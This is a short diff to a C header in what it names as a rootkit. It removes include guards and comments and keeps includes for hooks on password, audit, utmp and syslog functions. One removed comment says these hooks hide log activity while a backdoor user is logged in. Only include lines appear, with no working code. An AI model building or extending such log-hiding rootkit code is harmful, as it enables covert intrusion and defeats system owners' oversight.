@@ -1,11 +1,3 @@
-/* all of the headers within this file will be read during setup
- * for possible variable placeholders.
- * if a variable is required by a toggleable aspect of the rootkit,
- * and the said toggle is disabled, the variable is ignored. */
-
-#ifndef INCLUDES_H
-#define INCLUDES_H
-
 #include "bedevil.h"
 
 /* we need libdl.h right now as it provides essential
@@ -50,14 +42,8 @@ int socket(int domain, int type, int protocol);
 #include "hooks/pwd/pwd.h"
 
 #ifdef HIDE_SELF
-/* the functions in the following includes
- * are responsible for thwarting writing &
- * reading of logs when the backdoor user
- * is logged in. */
 #include "hooks/audit/audit.h"
 #include "hooks/utmp/utmp.h"
 #include "hooks/syslog/syslog.h"
 #endif
-#endif
-
 #endif
